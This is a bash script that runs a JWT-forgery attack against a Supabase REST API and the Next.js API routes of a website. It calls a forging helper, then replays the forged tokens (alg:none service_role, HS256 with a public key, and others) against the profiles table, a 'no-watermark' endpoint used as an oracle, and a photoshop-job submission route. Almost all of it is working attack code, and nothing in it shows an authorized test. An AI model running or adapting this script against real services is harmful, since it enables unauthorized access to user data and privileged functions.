#!/bin/bash
# Hunt 1: JWT forgery / signature-validation bypass against Supabase REST and Next.js API routes.
# Oracle: /api/no-watermark/<bogus> returns 401 for rejected bearer, 500 for accepted bearer.
source "$(dirname "$0")/env.sh"

echo "########## 0. Forge manifest ##########"
python3 "$(dirname "$0")/jwt_forge.py"
echo

echo "########## 1. Control: real token ##########"
req GET "$SUPA/rest/v1/profiles?select=user_id,role&limit=1" -H "apikey: $KEY" -H "Authorization: Bearer $TOKEN"
site GET "/api/no-watermark/test1"

echo "########## 2. REST /rest/v1/profiles with forged tokens ##########"
for f in /tmp/forged/*.txt; do
  name=$(basename "$f" .txt)
  [ "$name" = "valid_control" ] && continue
  echo ">>>>> variant: $name"
  req GET "$SUPA/rest/v1/profiles?select=user_id,role&limit=1" -H "apikey: $KEY" -H "Authorization: Bearer $(cat "$f")"
done

echo "########## 3. API oracle /api/no-watermark/test1 with forged tokens ##########"
for f in /tmp/forged/*.txt; do
  name=$(basename "$f" .txt)
  echo ">>>>> variant: $name"
  req GET "$SITE/api/no-watermark/test1" -H "Authorization: Bearer $(cat "$f")"
done

echo "########## 4. /api/submit-photoshop-job with forged service_role token ##########"
req POST "$SITE/api/submit-photoshop-job" -H "Authorization: Bearer $(cat /tmp/forged/alg_none_service_role.txt)" -H "Content-Type: application/json" -d '{}'
req POST "$SITE/api/submit-photoshop-job" -H "Authorization: Bearer $(cat /tmp/forged/hs256_pubkey.txt)" -H "Content-Type: application/json" -d '{}'

echo "########## 5. JWT sanity: tokens without apikey header ##########"
req GET "$SUPA/rest/v1/profiles?select=user_id&limit=1" -H "Authorization: Bearer $TOKEN"
